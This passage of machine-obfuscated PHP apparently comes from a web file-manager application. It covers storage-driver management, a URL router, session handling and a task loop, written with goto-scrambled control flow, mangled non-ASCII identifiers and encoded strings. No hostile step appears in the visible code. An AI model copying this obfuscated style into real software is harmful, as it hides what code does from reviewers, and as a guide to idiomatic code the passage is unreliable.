CéôòÙ­‘Ş; bâç‰óËáî: $Fù·§°É« =& $_SERVER[¢ÌÛ]; $aÈëƒïÀ¬« = Model($Fù·§°É«[1178]); $AïíÖÑÍƒ° = array($Fù·§°É«[396] => array($Fù·§°É«[7], array())); goto aœÔ«ÇÈÛÎ; CéôòÙ­‘Ş: } private function recycleMove($C÷›˜ŸÆ, $cÛ›ò§ù»ˆ = 1) { $aµ®²„ÉÈ´ =& $_SERVER[¢ÌÛ]; $f‡Í’Úº = Model($aµ®²„ÉÈ´[1178]); $bò²× ¼¼Ö = Model($aµ®²„ÉÈ´[1951]); $e„ïªËÒÜ = array($aµ®²„ÉÈ´[396] => $C÷›˜ŸÆ); if ($cÛ›ò§ù»ˆ) { $f‡Í’Úº->where($e„ïªËÒÜ)->setField($aµ®²„ÉÈ´[423], 1); $bò²× ¼¼Ö->eventRecycle($C÷›˜ŸÆ, $aµ®²„ÉÈ´[1952]); } else { $c¦ŒÂá… = $f‡Í’Úº->where($e„ïªËÒÜ)->find(); $D¦Ò‘õÅå = $c¦ŒÂá…[$aµ®²„ÉÈ´[397]] == $aµ®²„ÉÈ´[86]; $FğÅøæ·Ó = $f‡Í’Úº->fileNameAuto($c¦ŒÂá…[$aµ®²„ÉÈ´[488]], $c¦ŒÂá…[$aµ®²„ÉÈ´[28]], REPEAT_RENAME_FOLDER, $D¦Ò‘õÅå); if ($FğÅøæ·Ó != $c¦ŒÂá…[$aµ®²„ÉÈ´[28]]) { $f‡Í’Úº->rename($C÷›˜ŸÆ, $FğÅøæ·Ó); } $f‡Í’Úº->where($e„ïªËÒÜ)->setField($aµ®²„ÉÈ´[423], 0); $bò²× ¼¼Ö->eventRecycle($C÷›˜ŸÆ, $aµ®²„ÉÈ´[1953]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\163\x74\157\x72\141\x67\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\x73\x69\172\x65\115\x61\170", "\x73\171\x73\x74\x65\x6d", "\x64\145\x66\x61\165\154\x74", "\144\x72\x69\x76\x65\162", "\x63\157\156\x66\151\147"); public function listData($fâçÊ…ªø = false, $DÈã«òØìã = "\155\x6f\144\151\x66\171\124\151\x6d\x65", $e°ŞØ”ô®» = false) { goto AîÄÙØå°; Fã”•‘›Ú: return $F¼Ö›Ê”†; goto d“Û”â…; eÓÔ¦Â‹è£: foreach ($F¼Ö›Ê”† as $EÀ«°˜Áí” => $d˜ âˆ´˜§) { unset($F¼Ö›Ê”†[$EÀ«°˜Áí”][$aÈ¨¿ñ¹–¹[6]]); $F¼Ö›Ê”†[$EÀ«°˜Áí”][$aÈ¨¿ñ¹–¹[1643]] = 0; } $dîÈ’œÌô = array_to_keyvalue($F¼Ö›Ê”†, $aÈ¨¿ñ¹–¹[33], $aÈ¨¿ñ¹–¹[385]); $this->_listAppendSize($F¼Ö›Ê”†, $dîÈ’œÌô); goto Fã”•‘›Ú; AîÄÙØå°: $aÈ¨¿ñ¹–¹ =& $_SERVER[¢ÌÛ]; $F¼Ö›Ê”† = parent::listData($fâçÊ…ªø, $DÈã«òØìã, $e°ŞØ”ô®»); if ($fâçÊ…ªø) { return $F¼Ö›Ê”†; } goto eÓÔ¦Â‹è£; d“Û”â…: } public function _listAppendSize(&$FŞŒ¸‘ÂØ‰, $EÚ»ÕÊİ¢ò) { $f¦‡»ØÙŒ‹ =& $_SERVER[¢ÌÛ]; if (!$EÚ»ÕÊİ¢ò) { return; } $D­“ÈŒÕ¸ë = $f¦‡»ØÙŒ‹[1954] . implode($f¦‡»ØÙŒ‹[47], $EÚ»ÕÊİ¢ò) . $f¦‡»ØÙŒ‹[1955]; $cÔÓÏÜÔ‡ = Model($f¦‡»ØÙŒ‹[741])->query($D­“ÈŒÕ¸ë); $cÔÓÏÜÔ‡ = array_to_keyvalue($cÔÓÏÜÔ‡, $f¦‡»ØÙŒ‹[385], $f¦‡»ØÙŒ‹[77]); foreach ($FŞŒ¸‘ÂØ‰ as $d©øÈóœİ => $b‘‘ËœáĞš) { $FŞŒ¸‘ÂØ‰[$d©øÈóœİ][$f¦‡»ØÙŒ‹[1643]] = isset($cÔÓÏÜÔ‡[$b‘‘ËœáĞš[$f¦‡»ØÙŒ‹[385]]]) ? $cÔÓÏÜÔ‡[$b‘‘ËœáĞš[$f¦‡»ØÙŒ‹[385]]] : 0; } } public function getConfig($EöÓ³¦”ª) { $F—ô³ìš±ˆ = parent::listData($EöÓ³¦”ª); return json_decode($F—ô³ìš±ˆ[$_SERVER[¢ÌÛ][6]], !0); } public function update($AÕÊÊè¾¶§, $D¿¿ Å„ç¢) { goto fÂàÔ¤à†ñ; fÀéÂ…´Ûë: if (isset($fÕ·»¸Â›[$dÜÔˆ¬¥§]) && $fÕ·»¸Â›[$dÜÔˆ¬¥§][$DšÏŞ°ÛÚ™[385]] != $AÕÊÊè¾¶§) { return !1; } if (isset($D¿¿ Å„ç¢[$DšÏŞ°ÛÚ™[1956]]) && $D¿¿ Å„ç¢[$DšÏŞ°ÛÚ™[1956]] == $DšÏŞ°ÛÚ™[86]) { $this->checkConfig($D¿¿ Å„ç¢); } unset($D¿¿ Å„ç¢[$DšÏŞ°ÛÚ™[1956]]); goto AÔœœ©Ã¡; AÔœœ©Ã¡: $döíµîËìÎ = parent::update($AÕÊÊè¾¶§, $D¿¿ Å„ç¢); if ($döíµîËìÎ && $D¿¿ Å„ç¢[$DšÏŞ°ÛÚ™[34]]) { foreach ($fÕ·»¸Â› as $f†çøøŒœ) { if ($f†çøøŒœ[$DšÏŞ°ÛÚ™[34]] && $f†çøøŒœ[$DšÏŞ°ÛÚ™[385]] != $AÕÊÊè¾¶§) { parent::update($f†çøøŒœ[$DšÏŞ°ÛÚ™[385]], array($DšÏŞ°ÛÚ™[34] => 0)); } } } return $döíµîËìÎ; goto B‘é„Î££‰; fÂàÔ¤à†ñ: $DšÏŞ°ÛÚ™ =& $_SERVER[¢ÌÛ]; $dÜÔˆ¬¥§ = $D¿¿ Å„ç¢[$DšÏŞ°ÛÚ™[28]]; $fÕ·»¸Â› = array_to_keyvalue(parent::listData(), $DšÏŞ°ÛÚ™[28]); goto fÀéÂ…´Ûë; B‘é„Î££‰: } public function add($dßÏ†›ìëÃ) { goto Dô¼•àÙ‰Á; Dô¼•àÙ‰Á: $F¯ãØ–î¯ù =& $_SERVER[¢ÌÛ]; $bİçã¢ëç = array_to_keyvalue(parent::listData(), $F¯ãØ–î¯ù[28]); if (isset($bİçã¢ëç[$dßÏ†›ìëÃ[$F¯ãØ–î¯ù[28]]])) { return !1; } goto bÙ®Úø²¢; bÙ®Úø²¢: $this->checkConfig($dßÏ†›ìëÃ); $déœµÌ = parent::insert($dßÏ†›ìëÃ); if ($déœµÌ && $dßÏ†›ìëÃ[$F¯ãØ–î¯ù[34]]) { foreach ($bİçã¢ëç as $BâÏ¾äˆÍÀ) { if ($BâÏ¾äˆÍÀ[$F¯ãØ–î¯ù[34]]) { parent::update($BâÏ¾äˆÍÀ[$F¯ãØ–î¯ù[385]], array($F¯ãØ–î¯ù[34] => 0)); } } } goto c¸‡×¯Æ; c¸‡×¯Æ: return $déœµÌ; goto c“âİ¢ãÅÎ; c“âİ¢ãÅÎ: } public function checkConfig(&$FàŒˆ·áŸá) { goto dĞ™µ¡¹®; dĞ™µ¡¹®: $EÖã†ŒÌÇ‘ =& $_SERVER[¢ÌÛ]; $EõÏ¼ó“ê— = strtolower($FàŒˆ·áŸá[$EÖã†ŒÌÇ‘[93]]); $BÖ¬è¨Ï‹Ò = json_decode($FàŒˆ·áŸá[$EÖã†ŒÌÇ‘[6]], !0); goto AŸàø— öó; C˜ÆÀàÉ‚Á: $Féøç…§îß = isset($C¤ ©ğŠ±Ó[$EõÏ¼ó“ê—]) ? $C¤ ©ğŠ±Ó[$EõÏ¼ó“ê—] : ucfirst($EõÏ¼ó“ê—); $AÒ²„òµ¼ò = $EÖã†ŒÌÇ‘[71] . $Féøç…§îß; if (!$Féøç…§îß || !class_exists($AÒ²„òµ¼ò)) { write_log(array($EÖã†ŒÌÇ‘[1958], $FàŒˆ·áŸá, get_caller_info()), $EÖã†ŒÌÇ‘[1959]); show_json(LNG($EÖã†ŒÌÇ‘[1960]), !1, $FàŒˆ·áŸá); } goto b´„İÓ»¸; b´„İÓ»¸: $BÅå¨ì¨õš = new $AÒ²„òµ¼ò($BÖ¬è¨Ï‹Ò); if (in_array($EõÏ¼ó“ê—, $BÅå¨ì¨õš->objectDriver)) { if (!$BÅå¨ì¨õš->isBucketCors() && !$BÅå¨ì¨õš->setBucketCors()) { $F³¤‚’º‘» = LNG($EÖã†ŒÌÇ‘[1961]); $F³¤‚’º‘» .= $EÖã†ŒÌÇ‘[1962] . LNG($EÖã†ŒÌÇ‘[1963]); show_json($F³¤‚’º‘», !1); } } $Bº©å†‰ô† = rtrim($BÖ¬è¨Ï‹Ò[$EÖã†ŒÌÇ‘[1052]], $EÖã†ŒÌÇ‘[8]) . $EÖã†ŒÌÇ‘[8]; goto Aß‡Óà†ˆ; Aß‡Óà†ˆ: $FÀƒ†±Ì = $BÅå¨ì¨õš->getPath($Bº©å†‰ô† . $EÖã†ŒÌÇ‘[1112]); if (!$BÅå¨ì¨õš->mkfile($FÀƒ†±Ì)) { show_json(LNG($EÖã†ŒÌÇ‘[1961]), !1); } $BÖ¬è¨Ï‹Ò[$EÖã†ŒÌÇ‘[1052]] = $Bº©å†‰ô†; goto DÖôšŸª¤¨; DÖôšŸª¤¨: $FàŒˆ·áŸá[$EÖã†ŒÌÇ‘[6]] = json_encode($BÖ¬è¨Ï‹Ò); $FàŒˆ·áŸá[$EÖã†ŒÌÇ‘[93]] = $Féøç…§îß; return !0; goto AÏÕïòè¤š; AŸàø— öó: foreach ($BÖ¬è¨Ï‹Ò as $BÕ¥àÛåç» => $b„©ä¨•ë) { $BÖ¬è¨Ï‹Ò[$BÕ¥àÛåç»] = trim($b„©ä¨•ë); } $BÖ¬è¨Ï‹Ò[$EÖã†ŒÌÇ‘[1957]] = rand_string(6); $C¤ ©ğŠ±Ó = $GLOBALS[$EÖã†ŒÌÇ‘[6]][$EÖã†ŒÌÇ‘[87]][$EÖã†ŒÌÇ‘[775]]; goto C˜ÆÀàÉ‚Á; AÏÕïòè¤š: } public function driverListSystem() { $CÄ£»ÜËôã =& $_SERVER[¢ÌÛ]; $eá¡èªÒë = parent::listData(); $BÁİª•÷ = array(); foreach ($eá¡èªÒë as $AÅ–Ğ•Ó´Î) { unset($AÅ–Ğ•Ó´Î[$CÄ£»ÜËôã[192]], $AÅ–Ğ•Ó´Î[$CÄ£»ÜËôã[83]]); $AÅ–Ğ•Ó´Î[$CÄ£»ÜËôã[6]] = json_decode($AÅ–Ğ•Ó´Î[$CÄ£»ÜËôã[6]], !0); $BÁİª•÷[] = $AÅ–Ğ•Ó´Î; } return $BÁİª•÷; } public function defaultDriver() { $a÷Èî—Ä­İ =& $_SERVER[¢ÌÛ]; $A««¤”¦Ÿ÷ = parent::listData(); $fÚÈÇç’“‹ = array_filter_by_field($A««¤”¦Ÿ÷, $a÷Èî—Ä­İ[34], 1); $fÚÈÇç’“‹ = $fÚÈÇç’“‹[0]; if ($fÚÈÇç’“‹) { $fÚÈÇç’“‹[$a÷Èî—Ä­İ[6]] = json_decode($fÚÈÇç’“‹[$a÷Èî—Ä­İ[6]], !0); } return $fÚÈÇç’“‹; } public function driverInfo($f¦™¹÷±›) { $e•©¹ÛÖÇÃ =& $_SERVER[¢ÌÛ]; $E‚ƒØîÇ¹ = array_to_keyvalue(parent::listData(), $e•©¹ÛÖÇÃ[385]); if (!isset($E‚ƒØîÇ¹[$f¦™¹÷±›])) { return !1; } $bÉ¸İ÷™ãØ = $E‚ƒØîÇ¹[$f¦™¹÷±›]; $bÉ¸İ÷™ãØ[$e•©¹ÛÖÇÃ[6]] = json_decode($bÉ¸İ÷™ãØ[$e•©¹ÛÖÇÃ[6]], !0); return $bÉ¸İ÷™ãØ; } public function remove($e…Êí§Ç™) { $this->removeShareItems($e…Êí§Ç™); return parent::remove($e…Êí§Ç™); } public function removeWithFile($CšÄó±ó½—, $e©½¢„¢„Ñ) { goto CÀÉó÷ğ¨Û; aªŠàÎá”­: $E¢ñ«Ùœã…->task[$a‘™Ù‘„’Š[721]] = (double) $FÊ–ÎªİÔ; $E•¾‡œ¼õİ = KodIO::defaultDriver(); $EŸ£ŞË­¾ = $E•¾‡œ¼õİ[$a‘™Ù‘„’Š[385]]; goto F¬Ú½â¬÷Ì; CÀÉó÷ğ¨Û: $a‘™Ù‘„’Š =& $_SERVER[¢ÌÛ]; $fµ‡×¤££“ = array($a‘™Ù‘„’Š[766] => $CšÄó±ó½—); $bƒ×Å™’É = Model($a‘™Ù‘„’Š[448])->where($fµ‡×¤££“)->count(); goto c‰ßÑ·ïê; F¬Ú½â¬÷Ì: $DñÚÆéöøé = "\x7b\x69\157\72{$EŸ£ŞË­¾}\x7d\57"; $DùÏ°“ÖÒò = !0; $FÈñÅÉí„‘ = array(); goto fÃã…î§šÅ; c‰ßÑ·ïê: $FÊ–ÎªİÔ = Model($a‘™Ù‘„’Š[448])->where($fµ‡×¤££“)->sum($a‘™Ù‘„’Š[77]); $CÄ›ğäìã¢ = $e©½¢„¢„Ñ . $a‘™Ù‘„’Š[1964] . $CšÄó±ó½—; $E¢ñ«Ùœã… = new TaskFileTransfer($CÄ›ğäìã¢, $a‘™Ù‘„’Š[1959], $bƒ×Å™’É, LNG($a‘™Ù‘„’Š[1965]) . "\x28{$CšÄó±ó½—}\51"); goto aªŠàÎá”­; Fà¿çÊ÷¦á: if (!$DùÏ°“ÖÒò) { $E¢ñ«Ùœã…->stop($CÄ›ğäìã¢); return !1; } $E¢ñ«Ùœã…->end(); if ($e©½¢„¢„Ñ == $a‘™Ù‘„’Š[1623]) { $this->remove($CšÄó±ó½—); } goto d‰Óò˜Í¼; fÃã…î§šÅ: $b½’éîÙÛ = Model($a‘™Ù‘„’Š[173])->where($fµ‡×¤££“)->field($a‘™Ù‘„’Š[1966])->select(); foreach ($b½’éîÙÛ as $cÈï¦¬•·Ä) { goto bùÀÜ³„¼Ö; bùÀÜ³„¼Ö: $Aß Âê¡ÊÑ = $cÈï¦¬•·Ä[$a‘™Ù‘„’Š[75]]; $CŒŠÔ…œ¹÷ = $DñÚÆéöøé . str_replace("\x7b\x69\x6f\72{$CšÄó±ó½—}\175\x2f", $a‘™Ù‘„’Š[33], $Aß Âê¡ÊÑ); if (!IO::exist($Aß Âê¡ÊÑ)) { $FÈñÅÉí„‘[] = $cÈï¦¬•·Ä[$a‘™Ù‘„’Š[445]]; $E¢ñ«Ùœã…->updateFileEnd($cÈï¦¬•·Ä[$a‘™Ù‘„’Š[28]], $cÈï¦¬•·Ä[$a‘™Ù‘„’Š[77]]); continue; } goto dÚãŒĞß¹“; dÚãŒĞß¹“: if (IO::exist($CŒŠÔ…œ¹÷)) { $E¢ñ«Ùœã…->updateFileEnd($cÈï¦¬•·Ä[$a‘™Ù‘„’Š[28]], $cÈï¦¬•·Ä[$a‘™Ù‘„’Š[77]]); continue; } if (!IO::move($Aß Âê¡ÊÑ, get_path_father($CŒŠÔ…œ¹÷))) { $DùÏ°“ÖÒò = !1; break; } $fµ‡×¤££“ = array($a‘™Ù‘„’Š[445] => $cÈï¦¬•·Ä[$a‘™Ù‘„’Š[445]]); goto C¾‡õÕÊ; C¾‡õÕÊ: $B’¸ŒÑ•îˆ = array($a‘™Ù‘„’Š[766] => $EŸ£ŞË­¾, $a‘™Ù‘„’Š[75] => $CŒŠÔ…œ¹÷); Model($a‘™Ù‘„’Š[173])->where($fµ‡×¤££“)->save($B’¸ŒÑ•îˆ); goto eÁ§£°¡àŒ; eÁ§£°¡àŒ: } $this->removeByFileID($FÈñÅÉí„‘); goto Fà¿çÊ÷¦á; d‰Óò˜Í¼: } public function progress($f‚õÈ‹†¾¬, $eÈ–Ç‰Âó) { return Task::get($eÈ–Ç‰Âó . $_SERVER[¢ÌÛ][1964] . $f‚õÈ‹†¾¬); } private function removeByFileID($d‚…˜ƒ‘ = array()) { goto Aºµ¾ë¾†°; d¤Æàë„Ç: $e¥Éòé¡ = Model($Bî‡†ß†× [1178])->where($c¾Éê¢å¡»)->field($Bî‡†ß†× [396])->select(); if (!$e¥Éòé¡) { return; } $e¥Éòé¡ = array_to_keyvalue($e¥Éòé¡, $Bî‡†ß†× [33], $Bî‡†ß†× [396]); goto Cƒí®´‹§‚; Aºµ¾ë¾†°: $Bî‡†ß†×  =& $_SERVER[¢ÌÛ]; if (empty($d‚…˜ƒ‘)) { return; } $c¾Éê¢å¡» = array($Bî‡†ß†× [445] => array($Bî‡†ß†× [7], $d‚…˜ƒ‘)); goto d¤Æàë„Ç; Cƒí®´‹§‚: foreach ($e¥Éòé¡ as $Cà‚ğÍïÚô) { Model($Bî‡†ß†× [409])->removeNow($Cà‚ğÍïÚô, !1); } goto CÁ†Å‚Ü; CÁ†Å‚Ü: } private function removeShareItems($DÁŞöĞ¯‘¨) { goto FŠâİã±Œ¸; FŠâİã±Œ¸: $f˜’â¦ÆÖ· =& $_SERVER[¢ÌÛ]; $b¨ïˆĞâõ = "\173\x69\x6f\72{$DÁŞöĞ¯‘¨}\x7d\57"; $dö½¢Ó¤›— = array($f˜’â¦ÆÖ·[396] => 0, $f˜’â¦ÆÖ·[1047] => array($f˜’â¦ÆÖ·[375], "{$b¨ïˆĞâõ}\45")); goto C„Şá‚õÍö; C„Şá‚õÍö: $d§ßØÂµ = Model($f˜’â¦ÆÖ·[1634])->where($dö½¢Ó¤›—)->field($f˜’â¦ÆÖ·[466])->select(); if (empty($d§ßØÂµ)) { return; } $dÌÒ“ŠŸ· = array_to_keyvalue($d§ßØÂµ, $f˜’â¦ÆÖ·[33], $f˜’â¦ÆÖ·[466]); goto bÇä­‰éÁØ; bÇä­‰éÁØ: Model($f˜’â¦ÆÖ·[561])->remove($dÌÒ“ŠŸ·); goto Eøµ—óíè•; Eøµ—óíè•: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x4c\x69\147\150\x74\101\x70\160"; public $modelType = "\123\x79\163\164\145\x6d\117\x70\164\151\157\156"; public $field = array("\x6e\141\x6d\145", "\147\162\x6f\165\x70", "\144\145\x73\143", "\143\157\x6e\164\145\x6e\164"); public function listData($CŸ©Ü„“œ = false, $F‡ êÜ¼¢‡ = "\x6d\157\x64\151\x66\171\x54\x69\155\145", $aˆœÅ¼£ïŠ = true) { return parent::listData($CŸ©Ü„“œ, $F‡ êÜ¼¢‡, $aˆœÅ¼£ïŠ); } public function remove($Dß„ì§ëÒ) { $fñç¨Š…É = $this->findByName($Dß„ì§ëÒ); if (!$fñç¨Š…É) { return !1; } return parent::remove($fñç¨Š…É[$_SERVER[¢ÌÛ][385]]); } public function add($Eî£ŞÊŠ¸) { if ($this->findByName($Eî£ŞÊŠ¸[$_SERVER[¢ÌÛ][28]])) { return !1; } return parent::insert($Eî£ŞÊŠ¸); } public function update($f†¤˜©“¨å, $bŞ•„ÏÖğµ) { $f¦¿”¤ÂÖ‡ =& $_SERVER[¢ÌÛ]; $BİÙ¢­È² = $this->findByName($f†¤˜©“¨å); $cĞØ»¹õĞ = $this->findByName($bŞ•„ÏÖğµ[$f¦¿”¤ÂÖ‡[28]]); if (!$BİÙ¢­È² || $cĞØ»¹õĞ && $cĞØ»¹õĞ[$f¦¿”¤ÂÖ‡[385]] != $BİÙ¢­È²[$f¦¿”¤ÂÖ‡[385]]) { return !1; } return parent::update($BİÙ¢­È²[$f¦¿”¤ÂÖ‡[385]], $bŞ•„ÏÖğµ); } } goto aèÌ—Ö¦ã¢; b¼—å¤¡: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\136\x2f\135\53", "\x3a\156\165\x6d" => "\x5b\60\55\x39\x5d\x2b", "\x3a\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($A•îóÖö¸, $f¸‰çÃßù‰) { $f—´èŠ½Âæ =& $_SERVER[¢ÌÛ]; if ($A•îóÖö¸ == $f—´èŠ½Âæ[1446]) { $eßøñøÍ÷ª = array_map($f—´èŠ½Âæ[1447], $f¸‰çÃßù‰[0]); $B©§©åÙ’õ = strpos($f¸‰çÃßù‰[1], $f—´èŠ½Âæ[8]) === 0 ? $f¸‰çÃßù‰[1] : $f—´èŠ½Âæ[8] . $f¸‰çÃßù‰[1]; $Cµ¿İ®Æ« = $f¸‰çÃßù‰[2]; } else { $eßøñøÍ÷ª = null; $B©§©åÙ’õ = strpos($f¸‰çÃßù‰[0], $f—´èŠ½Âæ[8]) === 0 ? $f¸‰çÃßù‰[0] : $f—´èŠ½Âæ[8] . $f¸‰çÃßù‰[0]; $Cµ¿İ®Æ« = $f¸‰çÃßù‰[1]; } array_push(self::$maps, $eßøñøÍ÷ª); array_push(self::$routes, $B©§©åÙ’õ); array_push(self::$methods, strtoupper($A•îóÖö¸)); array_push(self::$callbacks, $Cµ¿İ®Æ«); } public static function error($e¨ˆó©•·) { self::$errorCallback = $e¨ˆó©•·; } public static function haltOnMatch($AÛÍÍƒÈÙ = true) { self::$halts = $AÛÍÍƒÈÙ; } public static function dispatch() { goto Bİ´Ñ÷‡; Bİ´Ñ÷‡: $aáóÈËÈïÄ =& $_SERVER[¢ÌÛ]; $C£÷Æçö© = parse_url($_SERVER[$aáóÈËÈïÄ[1448]], PHP_URL_PATH); $DŠèöéç†Ş = $_SERVER[$aáóÈËÈïÄ[156]]; goto cé‡©ˆ–Íˆ; cé‡©ˆ–Íˆ: $C˜­–â° = array_keys(static::$patterns); $C­—¦Â¢ç = array_values(static::$patterns); $fó¿®ğê¿È = !1; goto Bä’´©¤; Bä’´©¤: self::$routes = preg_replace($aáóÈËÈïÄ[1135], $aáóÈËÈïÄ[8], self::$routes); if (in_array($C£÷Æçö©, self::$routes)) { $aµ ¹èÑñ = array_keys(self::$routes, $C£÷Æçö©); foreach ($aµ ¹èÑñ as $F†ï’®ÕÎ) { if (self::$methods[$F†ï’®ÕÎ] == $DŠèöéç†Ş || self::$methods[$F†ï’®ÕÎ] == $aáóÈËÈïÄ[1449] || in_array($DŠèöéç†Ş, self::$maps[$F†ï’®ÕÎ])) { $fó¿®ğê¿È = !0; if (!is_object(self::$callbacks[$F†ï’®ÕÎ])) { $Cöİ‹®»Ö = explode($aáóÈËÈïÄ[8], self::$callbacks[$F†ï’®ÕÎ]); $fÂæÉ¶ÍàØ = end($Cöİ‹®»Ö); $cÂ±­·¡­Í = explode($aáóÈËÈïÄ[1450], $fÂæÉ¶ÍàØ); $dÕ£ğ™¶Ó» = new $cÂ±­·¡­Í[0](); $dÕ£ğ™¶Ó»->{$cÂ±­·¡­Í[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$F†ï’®ÕÎ]); if (self::$halts) { return; } } } } } else { $b”ŸŠ§ƒŒö = 0; foreach (self::$routes as $F†ï’®ÕÎ) { if (strpos($F†ï’®ÕÎ, $aáóÈËÈïÄ[4]) !== !1) { $F†ï’®ÕÎ = str_replace($C˜­–â°, $C­—¦Â¢ç, $F†ï’®ÕÎ); } if (preg_match($aáóÈËÈïÄ[1451] . $F†ï’®ÕÎ . $aáóÈËÈïÄ[1452], $C£÷Æçö©, $c¡ÌœßÁŸñ)) { if (self::$methods[$b”ŸŠ§ƒŒö] == $DŠèöéç†Ş || self::$methods[$b”ŸŠ§ƒŒö] == $aáóÈËÈïÄ[1449] || !empty(self::$maps[$b”ŸŠ§ƒŒö]) && in_array($DŠèöéç†Ş, self::$maps[$b”ŸŠ§ƒŒö])) { $fó¿®ğê¿È = !0; array_shift($c¡ÌœßÁŸñ); if (!is_object(self::$callbacks[$b”ŸŠ§ƒŒö])) { $Cöİ‹®»Ö = explode($aáóÈËÈïÄ[8], self::$callbacks[$b”ŸŠ§ƒŒö]); $fÂæÉ¶ÍàØ = end($Cöİ‹®»Ö); $cÂ±­·¡­Í = explode($aáóÈËÈïÄ[1450], $fÂæÉ¶ÍàØ); $dÕ£ğ™¶Ó» = new $cÂ±­·¡­Í[0](); if (!method_exists($dÕ£ğ™¶Ó», $cÂ±­·¡­Í[1])) { echo $aáóÈËÈïÄ[1453]; } else { call_user_func_array(array($dÕ£ğ™¶Ó», $cÂ±­·¡­Í[1]), $c¡ÌœßÁŸñ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$b”ŸŠ§ƒŒö], $c¡ÌœßÁŸñ); if (self::$halts) { return; } } } } $b”ŸŠ§ƒŒö++; } } if ($fó¿®ğê¿È == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $b„“ÍÊòÜ¸ =& $_SERVER[¢ÌÛ]; header($_SERVER[$b„“ÍÊòÜ¸[1454]] . $b„“ÍÊòÜ¸[1455]); echo $b„“ÍÊòÜ¸[1456]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aáóÈËÈïÄ[1448]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto f¿ˆù¤ˆ¡; f¿ˆù¤ˆ¡: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto dç•Š¢Ş¹Ø; CÙ—ùÚ£ø§: $bø©é„¬°ª = $bÅš‘åó‚[$bºóÁ­Î†]; $A¿‰Üø²É = $bÅš‘åó‚[$c³…êñçÍ[777]]; switch ($bºóÁ­Î†) { case $c³…êñçÍ[17]: self::$handle = Model($c³…êñçÍ[778]); break; case $c³…êñçÍ[779]: self::$handle = new CacheRedis($bø©é„¬°ª, $A¿‰Üø²É); break; case $c³…êñçÍ[780]: self::$handle = new CacheMemcached($bø©é„¬°ª, $A¿‰Üø²É); break; case $c³…êñçÍ[173]: $bø©é„¬°ª[$c³…êñçÍ[75]] = $bø©é„¬°ª[$c³…êñçÍ[75]] . $c³…êñçÍ[1460]; self::$handle = new CacheFile($bø©é„¬°ª, $A¿‰Üø²É); default: break; } goto DÇ˜Ñ±ÌĞ—; dç•Š¢Ş¹Ø: $c³…êñçÍ =& $_SERVER[¢ÌÛ]; static $DÏ§§“¾óˆ = false; if ($DÏ§§“¾óˆ) { return $DÏ§§“¾óˆ; } goto e·æÒÉéø¿; e·æÒÉéø¿: $bÅš‘åó‚ = $GLOBALS[$c³…êñçÍ[6]][$c³…êñçÍ[345]]; self::$sessionTime = $bÅš‘åó‚[$c³…êñçÍ[1457]]; $a§Š¿®Ä®ƒ = isset($GLOBALS[$c³…êñçÍ[1458]]) ? $GLOBALS[$c³…êñçÍ[1458]] : SESSION_ID; goto c˜ªÅáâ‡Š; c˜ªÅáâ‡Š: if (self::$sessionSign) { } else { if (Cookie::get($a§Š¿®Ä®ƒ)) { self::$sessionSign = Cookie::get($a§Š¿®Ä®ƒ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($a§Š¿®Ä®ƒ, self::$sessionSign, self::$sessionTime); $bºóÁ­Î† = $bÅš‘åó‚[$c³…êñçÍ[1459]]; goto CÙ—ùÚ£ø§; DÇ˜Ñ±ÌĞ—: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $DÏ§§“¾óˆ = new self(); return $DÏ§§“¾óˆ; goto cÈ±À×õÊÄ; cÈ±À×õÊÄ: } public static function sign($fªçŠ†Öâˆ = false) { $fªçŠ†Öâˆ && (self::$sessionSign = $fªçŠ†Öâˆ); self::init(); return self::$sessionSign; } public static function set($f…÷²Î…¢Ë, $fç²ğ¨¶ïô = false) { self::init(); if (is_array($f…÷²Î…¢Ë)) { foreach ($f…÷²Î…¢Ë as $dšß…Ú¿¬Ç => $bß–çèãë) { array_set_value(self::$data, $dšß…Ú¿¬Ç, $bß–çèãë); } } else { array_set_value(self::$data, $f…÷²Î…¢Ë, $fç²ğ¨¶ïô); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($F·øÑÛÓÁœ = false) { self::init(); if (!$F·øÑÛÓÁœ) { return self::$data; } return array_get_value(self::$data, $F·øÑÛÓÁœ); } public static function remove($a†œÊœ¬ëŞ) { self::init(); unset(self::$data[$a†œÊœ¬ëŞ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¢ÌÛ][782])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto CÙ¬È‚Üóï; B­ìòÂ…†: while (!0) { self::cacheClear(); if (self::valueGet($dŞöñÌÁÍ[712]) != $dŞöñÌÁÍ[86]) { self::valueSet($dŞöñÌÁÍ[1461], $dŞöñÌÁÍ[495]); self::log($dŞöñÌÁÍ[1465]); die; } self::valueSet($dŞöñÌÁÍ[1461], $dŞöñÌÁÍ[86]); self::valueSet($dŞöñÌÁÍ[1462], time()); self::taskRunAll(); sleep(self::valueGet($dŞöñÌÁÍ[1466])); } goto f÷·ó™âèÅ; fÍº—ëîä: http_close(); self::valueSet($dŞöñÌÁÍ[1461], $dŞöñÌÁÍ[86]); Hook::bind($dŞöñÌÁÍ[1463], $dŞöñÌÁÍ[1464]); goto B­ìòÂ…†; CÙ¬È‚Üóï: $dŞöñÌÁÍ =& $_SERVER[¢ÌÛ]; if 